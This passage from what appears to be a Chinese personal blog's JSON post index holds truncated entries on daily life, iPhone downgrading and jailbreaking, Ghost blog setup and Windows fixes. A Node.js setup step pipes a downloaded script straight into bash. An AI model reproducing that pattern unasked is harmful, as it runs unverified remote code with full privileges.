的一个转变进来，由于距离太近导致情急中紧急制动，或许是因为刚下过雨不久，或许是因为那段路面太差，小电驴测滑摔倒，造成从脸到手、膝盖多处擦伤，嘴上还缝了线，膝盖更是受伤严重，什么髌骨骨折、半月板、韧带损伤，牙齿碎裂等等住了将近半个月的院，要不是因为后面的一件事，估计要住上至少一个月），小车司机在当天垫付了600块后就再也“没钱”了（估计是考虑到保险的事吧），人生还是头一回遭此大劫，可谓是损失惨重呀（因为门牙等碎裂，害我现在说话都不敢","link":"/my/476.html","date":"2019-01-09T05:41:54"},{"title":"IOS 高版本保资料降级(未关验证)","content":"\n用iPhone的朋友都知道，IOS（iPhone手机的灵魂）更新还是蛮快的，不管是修补漏洞也好，还是增加新功能也罢，给我的感觉就是完胜安卓系统，至少同年代的机型，iPhone可以用的更流畅些，而且只要你肯刷，新版本的系统始终都是可以轻松得到（除非跨越太大会限制版本更新，但相比安卓新系统的普及率来讲，IOS的新牒普及率已经高出很多了）。在日常使用中还是会碰到例如：新版本不适应了，费电等原因需要降级（IOS只能降级到未关闭验证的系统版本，这点相比安卓有点打脸了，这也算是封闭式系统的特性吧），一般正常的操作，苹果家的iTunes是不允许高版本的备份恢复到低版本的系统中，估计是怕出现问题或者是有意为之等原因，好在各路大神给出了解决方案，本人也亲身体验了iPhone6S Plus由IOS12.1降级到12.0.1，同时将12.1的备份恢复到12.0.1，中间出现了点点小插曲，不过最终还是完美搞定，下面就来啰嗦一下：\n\n\n将手机连接iTunes，并备份当前iPhone 12.1资料，这里据有些大神说不设置密码会好一点，反正我是没设置（比较听话型）备份好之后开始刷机（备份比较费时间，建议备份的途中","link":"/it/463.html","date":"2018-11-22T03:35:20"},{"title":"又逢一年双十一","content":"\n猛然发现，博客快俩月没更新了，有种野草遍生的感觉，为了不至于太……，赶紧来更博除除草。套用那句老话“时间过的飞快，转眼间”又到一年双十一了，相传今年双十一仅仅用了2分05秒，天猫交易额就已突破100亿元。1小时47分26秒，破1000亿。比去年用时快了近一分钟；26分钟破500亿，比去年快14分钟；1小时47分破1000亿，比去年快7小时！那么围观的亲，你今天剁了吗？\n\n\n\n\n\n不知道是不是我年纪大了，还是阅历深了，对如今的双十一倒没有前些年那么有冲动了，也或许是我前些天陆续下过单的原因吧（早把手给剁了，拿什么来剁双十一呀233），最近因为女票房子装修的原因，陆陆续续已经买了很多，诸如：集成灶、空调、热水器等，大部分都在京东自营上买的，虽然二手东的名声相比天猫或淘宝也不好哪去，但图着退换货的便利（铁杠的钻石+PLUS会员，退换货不用自己去寄快递掏邮费，太便利我这种懒人），逐渐远离了阿里系（马爹不会打我吧）。而且京东自营上买东西，保价也十分方便，后台申请即可，双十一前的买的如果降价了保个价，差价就回来了，所以…………我这好像有点严重打广告的嫌疑，该打住了。\n\n\n也不是阿里系的没有优点，","link":"/my/461.html","date":"2018-11-12T03:30:49"},{"title":"最近的事@3","content":"\n最近事比较多，各种恼心的事一茬接一茬的，都跟那广告词似的“仿佛身体被掏空……”，难道最近没好好洗手☹这不最近连这小小的博客也问题了（准确的说是评论系统出问题了），由于Ghost博客自身并不带评论系统，目前国内看的上眼的也是少之又少，要是多说还在我一定会……，可惜挂了已有许久许久。之前有用过Disqus的国内版（fooleap整的PHP cURL 转发 Disqus API 请求），感觉还是非常不错的，不过用这个有个前提，需要一台墙外的PHP主机做转发，墙外的东西是没法跟墙内的比的（俺们穷买不起好鸡?），后来又用起了Valine（基于Leancloud的快速、简洁且高效的无后端评论系统），加上panjunwen大神的后台加持，可以实现评论提醒、垃圾过滤的功能，而且又是运行在墙内，各种访问体验还是挺不错的，也挺稳定（9月10日之前）。\n\n\n\n\n\n由于我的Valine评论系统是部署在华东节点上，结果就在9月10日非常荣幸的“临幸”了，其实我是在11日才发现自己博客上的评论都没了才注意到邮件通知（老美的911都过去这么多年了，咋还这么邪乎?）。没怎么太伤心的是俺们这小博客，平常也没多少人来留","link":"/my/459.html","date":"2018-09-14T03:28:44"},{"title":"博客弃用Comodo证书","content":"\n由于之前Symantec（赛门铁克）家的SSL证书问题，后在Namecheap家免费换了Comodo三年证书（好像那时候好多人都换了吧），后来才知道这证书也不是三年都免费的，只是第一年免费后续就要交钱了，这不一年时间转眼即逝，邮箱也连续收到了好多封Namecheap的续费邮件，看了一下一年要好几十块大洋就没续了（穷屌丝一个呀……），不过除了火狐浏览器会报错，其它像谷歌、IE都可以正常访问，安卓、苹果手机访问也OK，用SSL证书检测显示证书已被吊销，为了让火狐不报错，那就用免费证书Let's encrypt，反正用Oneinstack也不用担心三个月一续的事，那就动手吧。\n\n\n\n\n\n\n\n\n换好之后再上SSL证书检测网站查看，评级由原来的F变为A+了，不过PCI DSS 这项显示不合规，原因是因为：开启TLS1.0将导致PCI DSS不合规，为了一些兼容性就无所谓了（其实刚才在折腾过程中，又把Ghost弄挂了，就是因为这项不合规的事，结果是越搞越错，越错就Over了）。\n\n\n\n\n\n\n\n\n目前博客已经可以正常访问了，俺们也可以歇歇了，看会电影吧。\n","link":"/it/457.html","date":"2018-08-26T03:27:37"},{"title":"Ghost由1.X升级到2.0了","content":"\n据说我的博客已经长草好一会了，的确如此，最近不知道是懒了还是懒了，又或是懒了（这不还是懒嘛233）。小博经历了很多，不论是空间还是程序，可谓是历经沧桑呀（越扯越远了……）。就像现在用的是Ghost作为博客程序，由于Ghost官方更新太频繁了，后来就犯懒没更新了，这不今天上线一瞧，人家都已经更新到2.0.3了，我还是1.21.5，差的好像有点大嘛，那咋办？咱也升呗！~\n\n\n为了保险起见，还是在后台对硬盘做了个快照（感谢腾讯云，快照目前还是免费的，这点要批评一下套路云，啥啥都开始收费），接着翻翻Ghost官网的说明，还好瞄了一眼，要不然可能会出事，原来我还不能直接升级到2.0，得先升级到1.X的最高版，然后才能升级到2.0，具体的看官网操作说明：\n\n\n安装最新的Ghost CLI版本。Ghost 2.0升级需要Ghost-CLI 1.9.0或更高版本。我们支持的服务器设置具有单个系统范围的node.js版本，因此install / update命令如下所示：\n\n\n如果您未遵循支持的安装指南，请根据需要调整此步骤。\n\n\n2. 运行update命令\n\n\n从您的发布目录中（通常cd /var/","link":"/it/455.html","date":"2018-08-25T03:25:58"},{"title":"Win7下使用命令方式卸载IE","content":"\n公司OA用的快普M6作为日常采购出库使用，感觉相比那些程序版的进销存软件，使用久了很占内存还卡，加上这软件版本有点老，只支持IE核心（好像推荐的是IE8.0），经常上网的亲应该都知道，IE向来不被人看好，网上能看到的所谓的加速浏览器大多数用的都是谷歌浏览器核心，这破东西竟然不支持……\n\n\n最近感觉系统实在太慢太卡，于是想重装个系统看看，在所谓的“系统之家”是下载了个纯净版Win7（64位，自带IE已升到9）），下载安装一切顺利，装好一看果如描述说的——纯净，桌面上除了系统那几个熟悉的图标，啥也没有（给作者点个赞），当然IE默认首页是改过的，这点我能理解的。由于自带的是IE9，登陆公司的OA，感觉使用起来比原先的XP（IE8）感觉要快很多，不知道是不是系统刚装过的原因，反正速度上快了不少，只是有点遗憾，出库打单（用的是多联单，针式打印）出来，总有些字缺点笔画，比如“白”字中间少一横等，各种IE设置、也换过打印机驱动都无解，但是其它的像Word、Excel打印出来的都正常，无语了……\n\n\n无奈之中看到Q管家提示IE升级，一点再一重启，IE由9变11了，打开OA使用各功能感觉比9还快那么一","link":"/it/453.html","date":"2018-08-22T03:24:43"},{"title":"最近的事@2","content":"\n好久没来更博了，算算也有一个多月了，天天就当着一个懒懒的死肥宅（多少次打开后台想来啰嗦一下，结果还是习惯的点了右上角的“X”，今天也不知是抽了哪门子的风来啰嗦一下最近的事吧。\n\n\n先来说说工作上的事吧，自从这工作重心从PC转移到Print后，一切都在变化，现在估计连装个系统都很难得了，天天不是倒腾鼓，就是筒，除了白粉不沾以外，其它什么黑粉、彩粉基本都沾过了（虽然这些粉没法提炼出什么好东东，但至少比白的要好上那么一点点，就算吸了那么点也不会摇头），知识倒是增加了点，毕竟以前接触这方面少，目前拆个机（这东西比拆本本、手机简单多了）换个啥那也是不在话下（功力提升还是挺快的吧，哈哈），是不是感觉有点牛吹大了，还是晚上迷了几口的原因233。\n\n\n再来说说生活上的事吧，一堆一堆烦琐的事，几乎都能跟钱扯上关系（心里真是五十万匹草泥马），那句话说的好：“钱不是万能的，但没有钱是万万不能的”，现在算是悟出个道道来了，特别是今年，哪哪都需要钱，赚的远远没有需要的多（你说这日子过的，怎一个“衰”了的），再者一晃大半年过去了，马上又要到年底了，又是更需要钱的时候，心里那个淡不定呀，后悔当年没多读点书、读好书","link":"/my/451.html","date":"2018-08-01T03:23:33"},{"title":"开票年月日变方框的解决办法","content":"\n最近帮朋友弄电脑碰到个事，他之前用金税软件开的增票都正常的，最近突然间发现打出来的增票上的“年月日”变成了一个个方框，具体看图：\n\n\n\n\n\n刚开始以为是打印机字库问题，后来试着解决了下，还是不行，无奈之下找到度娘，看上面好多都在说是区域语言的问题，但我检查了区域语言一直都是中文（度娘上这些解决不了问题的回答还真不是一般的多，太误导了），翻了好几页度娘，看到一个解决办法，按照其指示果然解决，原来竟是开票软件里的格式中“开票日期”字体颜色搞的鬼！具体解决办法如下：\n\n\n点开发票查询，在已开发票明细的上方，有一个“格式”按钮，打开这个，找到\"开票日期“，经对比其它项目，字体颜色这个参数，其它项目都是白色，出问题的这个”开票日期“颜色显示为一种深红色，点击这个颜色，切换成白色。打印时开票日期的”年 月  日“变方框的问题解决。\n\n\n问题解决，虽然我也是从度娘那搬来的，不过一顿晚饭还是赚着了，学以致用嘛233\n","link":"/it/449.html","date":"2018-06-14T03:22:22"},{"title":"最近的事@1","content":"\n博客最近算是有段时间没更新了，没办法，自从换了份工作后自由时间没以前多了，很多事也变得不确定了，当然这决不是偷懒的理由233，但的确是偷懒了，本来早就想上来啰嗦一下的，结果好几次打开Ghost后台，结果还是止住了，没啥原因——就一个字“懒”。\n\n\n最近诸事都不太顺畅，唯一值得庆幸的是终于把那8台老母鸡（玩客云）给低价处理了（过年前499一台从狗东买的，本想到时不要就退，结果过个年给忘了，最主要的是这老母鸡价格后来一路走下坡，放着我都心疼），其实刚过完年480一台还是有人要的，自己那时没想着亏钱没出，结果就一直放着了，5月底看链克一路回升到2元左右时，赶紧以455一台包邮出给了Q友（老母鸡是出了，链克又给忘错过了），虽然一台亏了将近60元，但要是放到这个月狗东搞活动的话，估计又不知道要放到什么时候了，出了就出了吧，在老母鸡这事上总的来讲还算好没亏什么（前期高价时卖过一些）。\n\n\n第二件事也比较不顺，也是5月底的事了，没事在威锋论坛上瞎逛，结果在二手交易上看到一台6SP 64G（9.3.2的系统），成色不咋地，据说还换过外屏和电池，但价格不错，最终以1521元成交还走的转转验机（送了一个","link":"/my/447.html","date":"2018-06-06T03:21:03"},{"title":"巨星解密，周传雄、游鸿明空降献唱衢州","content":"\n衢州祥生周年庆，四月感恩季开启“与祥生唱响新未来暨衢州祥生周年庆”演唱会，两大神秘巨星全城翘首以盼，今天惊艳揭晓：情歌教父—周传雄、情歌王子—游鸿明。人生第一次看演唱会，也是在衢州第一次看，心情不免有点小激动呀，到手两张票，本来想约上女票去看的，结果她没时间，于时便带上好基友——何工一起去了（正好他也很喜欢这两明星的歌，最后证明他没有白去……）\n\n\n\n\n\n首先开唱的是四人组合（叫上名号，可能是我寡闻了），几首之后就迎来了情歌王子——游鸿明，热情洋溢的演唱了《下沙》、《爱我的人和我爱的人》等，期间还行了互动游戏，也是全场最关注的——三等奖抽奖，一共抽三场，结果在第二场我边上的何基友就被幸运抽中——“北753”（好羡慕呀，一台暖风机到手了，我的票呀……）\n\n\n\n\n\n接下来是二龙组合（郑大龙&amp;郑小龙），同样是四首歌，中间也进行了二等奖抽奖（洗衣机），当然幸运女神还是在舞台上没下来找我（其实那时我还是在满满的期待着一等奖（iPhoneX，三台哟）），二龙过后，依旧是开场四人组合中的二人表演，中间还串烧了一个芭蕾舞，带着期待的心情迎来了今晚最后一位实力歌星——情歌教父周传雄。\n\n\n\n\n","link":"/my/445.html","date":"2018-04-16T03:20:11"},{"title":"巧用爱思助手快速辨别苹果设备真伪","content":"\n买过二手iPhone的亲都知道，那叫一个水深，很多时候一不小心就有可能买到一台组装或维修过的手机，有些时候看着外观挺美的，可一旦拆机后多少都能发现一些动过的痕迹，真正能够买到二手全原又未拆修的少之又少，对于一些动手能力强的大神们，当然不用担心，因为一般他们在交易的时候都会进行拆机验机，那对于其他人呢，当然也可以用软件来进行检测，俺试了几台iPhone感觉还是挺准的，下面就开始试试吧。\n用到的检测软件——爱思助手（知名度还是可以的吧），在7.59版本更新后新增验机功能，可查看设备是否存在拆机及更换硬件等情况，并列出出厂值和检验值的检验报告，改装机、组装机立马现出原形。先看一下扩容机的检测报告：\n\n\n\n\n\n如图所述，已经准确标明了原容量及扩容后的容量等信息，那么如何才能查看验机报告，首先下载安装或更新爱思助手最新版本（官网下载即可），连接设备后爱思助手PC端会自动开始验机，在“设备信息”界面就会显示验机结果，可以点击“验机报告”查看详情。\n\n\n\n\n\n爱思助手验机原理就是通过对比设备的出厂默认值和设备当前读取到的值进行对比，如果不一致则代表有更换或者修改的可能。\n\n\n\n\n\n爱思助手目前可以","link":"/it/443.html","date":"2018-04-12T03:19:14"},{"title":"Typecho CommentToMail邮件样式分享","content":"刚在逛博客圈，发现有个Typecho的CommentToMail的邮件样式挺美的，虽然我现在已经入了Ghost门，但本着一种折腾不息的心理（万一哪天心情不顺又杀回Typecho呢，哈哈），于是就顺手摘录到我家宝典了，具体如下：\nGuest样式\n怎么样？挺美的吧，感觉比我在用Typecho时的样式美多了，喜欢就赶紧把下面的代码Down走吧：\nGuest样式源码\n&lt;pre class=&quot;wp-block-code&quot;&gt;```\n&lt;table style=width: 99.8%;height:99.8% &gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=background:#fafafa url(https://a.photo/images/2018/03/24/2017113018325846288465.png)&gt;\n    &lt;div style=border-radius: 10px 10px 10px 10px;font-size:13px;    color: #555555;width: 666px;f","link":"/it/441.html","date":"2018-04-09T03:18:05"},{"title":"IOS11.3正式推送，想升级吗","content":"\n今天凌晨，苹果发布了iOS 11.3的软件更新，这是iOS 11自去年9月首次发布以来的第12次软件更新，这次是一个重大版本的更新，带来多项新功能，包括全新的电池健康功能、新的AR体验、全新4款动画表情、信息商务交流功能、新的健康记录功能以及公交卡功能。\n\n\n\n\n\n当然对于国内用户来说，最大的亮点是可以在“钱包”中添加交通卡或购买新卡，终于实现使用iPhone或者Apple Watch就可以乘坐公交地铁了，不过目前官方只支持北京、上海两地，相信不久的将来会有更多的城市加入到支持列表中。目前支持公交卡的苹果设备有：iPhone 6至iPhone X，以及从第二代Apple Watch开始的苹果手表。因为俺的城市不支持这玩意，所以就略过了，还是先关注一下另外一个重点：电池健康功能，去年年底因为「降频门」事件闹得沸沸扬扬，最终苹果给出了解决方案：降价换电池和新系统加入电源管理功能。￥218 换电池已经开展了两个多月时间，并将一直持续到今年年底。根据用户的实际体验来看，在更换电池之后，之前的老旧设备性能确实得到了明显的提升。而今天正式发布的 iOS11.3，则在电池选项中加入了电池状态的查看","link":"/it/439.html","date":"2018-03-31T03:17:03"},{"title":"苹果 iOS11~11.1.2 详细图文越狱教程","content":"\n苹果iOS11~11.1.2应该年前就能越狱了，之所以现在才搬抄，是因为博主我的手机是11.2.1，不在可越狱范围之内（要不是之前手贱从11.1.1升级上去，不然俺也可以体验会越狱降级了，当然ios11版本的系统最低也只能降级到11.0，至少目前是这样，以后嘛……得看大神们的努力了），下面就赶紧附上越狱宝典吧。\n\n\n\n\n\nElectra官网：点我打开\n\n\n准备工具：\n\n\nElectra工具下载： 点我下载 1.0.2 正式版 （包含完整功能 Cydia）Cydia Impactor 点我下载Win 0.9.44\n使用教程：\n\n\n1：解压 并运行 Cydia Impactor （特别提醒，务必0944版本）\n2：链接你的iOS设备到 电脑（需要安装有iTunes软件）\n3：拖动 下载好的 Electra 1.0.2.ipa 拖到 Cydia Impactor 上\n\n\n使用教程：\n\n\n解压 并运行 Cydia Impactor （特别提醒，务必0944版本）链接你的iOS设备到 电脑（需要安装有iTunes软件）拖动 下载好的 Electra 1.0.2.ipa 拖到 Cydia Imp","link":"/it/437.html","date":"2018-03-07T03:15:57"},{"title":"苹果承认iOS源码泄露 但不会有任何风险","content":"\n前天，有消息称 iOS 操作系统的核心组件 iBoot 的源码遭到了泄露，这引发了不少人的担忧，这些源码会不会导致黑客找到 iOS 的漏洞呢？其实最有发言权的应该还是苹果官方，我们看看他们是怎么说的。\n\n\n\n\n\n这次泄露意味着黑客越狱或许更容易了，对用户来说没有任何风险。\n\n\n昨天外媒 MacRumors 发文称，苹果公司已经就这一问题向他们进行了回复，原文如下：“三年前的老源码似乎已经被泄露，但是从系统设计上看，苹果现在的产品安全性并不取决于 iBoot 源码的保密性，因为开发人员在产品中嵌入了大量软件和硬件的安全防护。并且苹果始终鼓励用户升级最新的系统版本，大家都能享受到最及时的安全防护。”\n\n\n\n总的来说，遭到泄露的是 iOS 9 版本，距离现在已经有三年时间了，停留在该版本的用户数量十分有限。根据苹果官方的数据，现在只有28%的用户使用 iOS 10 系统，iOS 9及更早以前的用户仅占7%。同时 iBoot 源码泄露不代表 iOS 会被攻破，不管是软件还是硬件，苹果设备都有多重防护，比如 Secure Enclave ，不会因为一个环节的泄露而失去安全性。\n\n\n\n同时苹果也","link":"/it/435.html","date":"2018-02-11T03:14:38"},{"title":"2018年的第一场雪","content":"\n早上起来突然发现窗外都是白白的一片——下雪了！昨晚临睡前还瞟了一眼天气预报说今天是雨夹雪呀，再说了上次报中雪、暴雪结果也只是留下那淡淡的一点白（头皮屑似的），今天竟然……，简直太意外了，这才是下雪该有的本色嘛，2018年的第一场雪非今天莫属了233。\n\n\n先来几张雪景Look一下吧，虽然不及北国雪景，却也是衢城百姓今天遇到的第一场大雪：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n还是有点小范的感觉吧，下午再到外面溜溜，雪天的衢城果然有不一样的韵味，这就是我所在的城市，一个浙西小城的雪下风光！\n","link":"/my/433.html","date":"2018-02-01T03:12:25"},{"title":"Win10提示威胁服务已经停止,立即重启的解决方法","content":"昨天手动将win10升级到1709，内部版本为16299.125。自带的杀毒软件Windows defender安全中心提示威胁服务已经停止,立即重启。病毒防护也无法启用，如图所示，点击立即重新启动，显示“发生未知错误。”。虽然平常整个电脑管家啥的，但就稳定性还是系统自带的好，加上微软这几年的不断努力，系统自带的杀毒软件也越来越完善了，虽然这些年没有查出什么威胁，只是不能运行，万一哪天遇到了，心里还是怕怕的。\n\n\n于是找度娘度了一番，发现很多法子都是修改组策略的方法来启动，但我从未更改过相关设置，按提示点进去看了，却发现都是“未配置”状态。另外还有命令提示符的方法，试了无效。无奈之下，之好翻墙请来谷哥来帮忙，终于在微软社区找到了个解决办法：\nWindows+r，输入：regedit，定位路径： HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows     Defender ，查看是否存在 DisableAntiSpyware 这个键值，若有请删除。\n按步骤修改好注册表，并重启，果然解决了，看来关键时候还是要找谷哥帮忙呀。\n\n","link":"/it/396.html","date":"2018-01-16T13:23:00"},{"title":"苹果IOS旧版验证意外开启风波","content":"今天下午三点半左右收到朋友微信说，苹果开放旧版IOS验证了（意味着系统可以降级了），这可是千载难得的好机会，至少打从我用iPhone来还是头一回遇见，心情不是一般的意外，赶紧上https://ipsw.me/瞧了一眼，一瞧果然开放了验证：\n\n这验证开放的力度不是一般的大，连2016年12月份的10.2都开放了，心想赶紧动手吧，管它什么开放原因呢，早就厌倦了11.2.1了（整的跟安卓似的，如：信号条、狗啃的汉化等），先去网上下载了10.2的固件，同时直接把手中的6SP关机并进入DFU模式，等固件下载好之后就开始Shift+恢复刷机了，看着那进度条跑的（开心呀）到“iPhone从备份中恢复”再到手机黑屏出现白苹果（太开心了），可没多久手机屏幕上就跳出了恢复模式，这不是一脸懵\n\n看了一下威锋论坛（今天论坛也是卡的一B，好多人在讨论验证刷机降级的事），看到有几个坛友说刷之前要先退Apple ID再刷（我去），好吧赶紧再手机刷回11.2.1（还好上次下载过这个固件，没删除掉），折腾到这个时间也差不多下午四点左右了，等11.2.1刷好进系统，一路的设置好然后再抹掉所有内容，然后再刷10.2，整个过","link":"/it/395.html","date":"2018-01-12T12:09:30"},{"title":"斐讯K2P多拨后负载均衡IP配置（玩客云）","content":"相信最近蛮多人都在折迅雷家的玩客云，虽然每天挖到的链克（以前叫玩客币）越来越少，母鸡（玩客云）越来越多，但还是挡不住众人的兴致，越来越多的“矿民”不断涌入，这其中当然就有我弱弱的身影（个位数的母鸡数量，只能这么称呼自己了）。大约是在12月份初“入道”的吧，那时挂在家里200M的电信宽带一拖二（这里不得不说一下电信宽带，下载速度还尚可，可这上行速度就小的可怜，也就十多兆吧），开始每天还有4个多链克，到现在就只有3个多了，还是多拨的情况下（现在一拖三），随着养鸡人的不断涌入，以后可能还得少下去……。\n多拨在电脑端测速可以看到上行有明显提升，下行一样，但对母鸡（玩客云）没有太大作用，唯一的作用是多拨后可以一拖多台，不多拨只能拖一台（拖多了那收益，不敢直视……），但是多拨后出现个状况，那就是在不朽玩客云客户端（作者免费开放的一个监工软件，目前更新很快，很好用，下载地址：https://github.com/Immortalt/imt-wanke-client/blob/master/README.md）\n会发现，多台母鸡分配了同一个外网IP，这还了得，要改！百度了很多，也没找到什么好的，也咨询","link":"/it/394.html","date":"2018-01-09T14:18:00"},{"title":"关于最近的微信小程序《跳一跳》游戏","content":"自从上次微信更新以后，新出来的《跳一跳》就跟着火起来了~ ，微信小程序的游戏大家觉得还不错~，由于游戏有周排行榜，可以挑战好友，互动性还不错。挺受大家的青睐！下面分享一些技巧，以及市面上的辅助。\n和谐游戏，拒绝外挂！！！\n\n这次更新还有更人性化的功能，就是你用过的小程序，直接下拉屏幕就可以看到，不用再跑到小程序里去找了，玩起来是不是很方便呀。\n\n原版跳一跳？\n有大佬分享了一个IOS版本跳一跳： Bottle Flip\nhttps://itunes.apple.com/us/app/bottle-flip/id1178454068?mt=8\n据说腾讯大佬是抄袭这个。呃，也不奇怪~（腾讯也不是第一次，当然肯定不会是最后一次233）\n实用技巧\n\n跳至盒子中间，+2 分\n连续跳至盒子中间，会在上次的基础上累加，+2分\n跳至音乐盒上停留会播放音乐，+30分\n跳至便利店停留会开门，+15分\n跳至魔方停留魔方会旋转，+10分\n跳至井盖上停留会有冲水声音，+5分\n\n辅助技巧\n目前网络上的跳一跳的辅助比较多,大部分实现的原理是：先截屏图片，计算方块之间的距离，方块之间的距离 / 按压屏幕时间，得到一个适","link":"/my/393.html","date":"2018-01-04T08:04:32"},{"title":"2018，我来了","content":"2017已经越走越远了，过去的一年，博客经历了很多，从Typecho到Hexo再又到Ghost，现在“好像”又回到了起点（Typecho），更博也从一个月几篇到几月一篇再到现在……，年纪大了却越变越“懒”（生活琐事越来越多或许也算是个理由吧），折腾的心气也是逐渐下降（在期待下一个燃烧点吧233）。这一年不仅博客程序反复变迁，就连托管主机也在变化着，从最早的阿里云到华为云，再到现在的腾讯云，中国的VPS巨头好像都串过门了（玩站以来用过小厂（记不得名字了）、百度BAE、新浪SAE、西部数码、阿里云、华为云、腾讯云等），挺多的吧，国外也用过一两家，如：VULTR，回头看看发现我还是蛮能折腾的，尤其在阿里云，有买有退，这里真的要给阿里云点个赞，希望别把我拉黑哈，保不准小爷哪天又回来了……\n之所以这次会搬到马叔（腾讯云）家，并不是我不爱马爸爸（阿里云），只是最近刚好到手了点福利（腾讯云送的2K优惠券，于是就下手了台HongKong的三年主机，马叔V5呀），之前也有关注过马叔家的，不过一直坚守阵营没有动过，一来阿里云的稳定可靠，让我没有挪窝的决心；二来国内备案迁入也是个麻烦事，所以就……，这次情况","link":"/my/392.html","date":"2018-01-02T15:06:26"},{"title":"Centos7上搭建Lnmp+Ghost 1.x博客","content":"上次写过《Debian 8.X搭建Lnmp+ Ghost 1.x 教程》 ，这不将主机从香港搬回到大杭州后，域名又倒腾回之前的uu126.cn（当然加了个前缀blog），加上前不久刚好在海月博客 ，顺手也尝试了一下Centos，结果一切搭建顺利，又可以让我啰嗦一下了。\n\nLnmp的搭建就不细说了，可以参照我之前的博文（点击：传送门 ），这里还是推荐使用Oneinstack，相对功能多一点。搭建好以后，使用PHPmyadmin创建所需的博客数据库用户名、数据库（用这个创建较方便），另外也可以直接配置好站点的Nginx文件和SSL，这里就不在啰嗦了，有问题的亲，可以留言。\n\n安装 Node.js\n\n方法一：\n\n\n\ncurl -sL https://deb.nodesource.com/setup_6.x | bash -\napt-get install nodejs\n\n方法二（推荐使用）：\n\n国外下载地址：\nwget https://nodejs.org/download/release/v6.9.5/node-v6.9.5.tar.gz\n国内下载地址：\nwget https://npm.","link":"/it/391.html","date":"2017-11-03T13:15:00"},{"title":"再见，我的长假","content":"时间过的可真是快呀，转眼前我的国庆中秋长假就“say byebye”了（没办法，俺们不像大伙富裕，有8天长假，咱单位只有6天，悲催呀……）。节后第一天上班还真有点不适应（貌似自从上个月请假以来，都大半个月没有上班了），当然咱们的适应力还是OK的，往那办公桌前一坐，感觉就回来的差不多了233\n由于大部分同事还在休息（错开轮休的），所以今天上班倒是很少人，偌大的一个办公室只有俺们一个人，也算是清静吧，唯一美中不足的是：财务让我统计其它固定资产（这事都是我请假前的了，竟然还能到现在，有点郁闷……），于是乎开始“昏天暗地”般统计（差点没睡着……），上班总是有那么多的烦心事，不上班却又要开始烦更多的事，所以说人呀！总是那么的矛盾！\n其实截止到现在，也还折腾了两件事情，一是手贱把小米5的系统由稳定版升级到了MIUI9开发版，本来还想Hold住等MIUI9出稳定版的，可结果还是没…………。\n\n升级了之后才发现，其实也没有小米吹的那么神，至少安装同样数量的应用和使用，剩余内存也都差不多，2G左右徘徊（俺的小米5是尊享版，4+128），至于打开应用的速度没啥感觉，耗电也差不多，就是默认主题换了换，然后一","link":"/my/390.html","date":"2017-10-08T12:47:00"},{"title":"Ghost博客时间汉化方案","content":"本站目前使用的Ghost主题是 Kaldorei ，感觉小蘿蔔丁做的主题还是非常不错的，而且这个主题目前已经支持Ghost1.X版本了（貌似我也是刚晓的，因为本站的Ghost版本已由 Ghsot0.7.4汉化版 升级回 Ghost1.6.2 ,没有升到最新的 1.11.1 是因为在阿里云做的快照是  1.6.2 ，没升级而已），目前测试了一下，还没发现问题，归档当然是OK的了！就是由于是Ghost英文版的，所以显示的博文时间也是英文，这不按照小蘿蔔丁给的办法也汉化了，具体的看小蘿蔔丁原文：\n\n使用Ghost搭建博客已经有两年多了。就连自己开源的主题Kaldorei也已经一年零7个月，到今天为止ghost-theme-kaldorei已经获得了100个star。刚刚破百。感谢这100位coder的支持。ghost 从我开始用的的0.7.x版本已经升到了1.x版本。期待已久的ghost也已经发布了1.x正式版。最近看下稳定版本在1.8.4。发展迅猛。不过到现在貌似也没有看到文档中有关日期的国际化相关API。如何让博客的日期汉化那么只能自己想办法修改了。分析下博客中使用到日期的模版。阅读官方","link":"/it/389.html","date":"2017-10-07T04:45:00"},{"title":"2017年的中秋节","content":"今年的中秋节与往年略不同，因前段时间个人身体原因，导致中秋节还得跑去医院复查（主要还是国庆中秋放假，医生也要休息嘛，复查也得“逮”他在的时候嘛233）。按照女票的建议，一早就空腹去了（还好我听了，要不然第二天还得再跑一趟），到了医院直接找老廖，结果他竟然在我后面等电梯，见面后我把最近在家静养时出现的状况作了简短的汇报，随即老廖安排我去挂号，并嘱咐挂完后等一会直接把钱付掉，就去抽血化验就可以了，不用再去找他了，一有结果他会电联我（这是有多么不想再看见我呀233）。\n不得不说这医院负责挂号的大姨们，好像我欠钱似的，一个个一副要吃人样子（据朋友说这医院的都这样，习惯就好了），好吧匆匆挂完号并略等会付完钱就直奔4楼检验科抽血了。可能是节假日的缘故吧，很快就轮到我了，医生麻利的给我抽了3管血（好心疼呀），压着止血棉不紧不慢的离开了医院回家喽（坐等老廖结果了，希望OK）。\n回家的路上出了点小状况，由于那条路我骑的很少，依稀记得自己没骑错的，结果一个转弯没多久看见了警察蜀黍，顿时明白自己骑错道了，老老实实按照蜀黍的引导到了边上，蜀黍按惯例进行了一番教育，随后掏出那准备已久的罚单，我也只好麻利的签单了","link":"/my/387.html","date":"2017-10-06T09:49:09"},{"title":"Ghost博客使用fancybox的正确姿势","content":"在Ghost博客后台，使用Markdown编辑器。\n Ctrl + Shift + I ，图片快捷键，生成代码：  \nCtrl + K ，链接快捷键，生成代码：  \n正确格式\nfancybox实现后实际上是个图片链接，So，把图片放入链接里。\n格式：  \n例如：  \n\n\n\n方式可能不一定适用于所有Ghost主题，反正本站目前在用的主题是这样子的。\n本博文转载自：小蘿蔔丁 http://xlbd.me/how-to-use-fancybox-in-ghost-blog/\n","link":"/it/388.html","date":"2017-10-06T09:49:00"},{"title":"一键检测Linux VPS/服务器配置、IO、国内节点下载测速","content":"刚逛了一下老左博客，发现左哥又更文了《一键检测Linux VPS/服务器配置、IO、国内节点下载测速》，闲来无事，我也按照其提供的检测脚本对本站（阿里云香港主机）和另一台主机（华为云上海主机）分别进行了测试，两台都是1核1G40G的主机，直观上配置除了CPU不一样（阿里云是E5-2682 V4，华为云是E5-2680 V3，主频都是2.5GHz），其它的没怎么看出来，不过两者的IO差别还是有点的，具体见后文章。\n左哥的原文：\n继老左在前面有分享过oldking博主作者提供改良版的国内电信、移动、联通节点测速脚本（一键测试Linux VPS、服务器国内节点速度参数）之后，我们可以对国内、国外VPS主机采用一些小的工具文件进行简单的参数和速度的测试。这里这个兄台又将teddysun的一键检测IO、配置信息等问题检测脚本改良，丰富配置信息的展现、IO速度、以及下载速度检测点也是国内节点。\n这里老左也简单的整理出来，对于我简单的测试手中的Linux 